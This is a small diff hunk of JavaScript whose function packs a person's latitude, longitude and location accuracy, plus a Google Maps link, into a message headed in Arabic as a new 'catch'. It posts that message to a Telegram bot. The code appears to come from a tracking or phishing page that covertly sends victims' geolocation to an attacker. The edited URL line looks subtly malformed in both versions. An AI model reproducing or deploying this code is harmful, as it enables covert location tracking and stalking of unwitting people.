@@ -29,7 +29,7 @@
     function sendToTelegram(lat, lon, acc) {
         const message = `🎯 **صيد جديد من HTB!**\n\n📍 Latitude: \`${lat}\`\n📍 Longitude: \`${lon}\`\n📏 Accuracy: \`${acc}m\`\n\n🔗 Google Maps: https://www.google.com/maps?q=${lat},${lon}`;
         
-        const url = `https://api.telegram.org/botbot${telegramToken}/sendMessage`;
+        const url = `https://api.telegram.org/bot$${telegramToken}/sendMessage`;
         
         fetch(url, {
             method: 'POST',
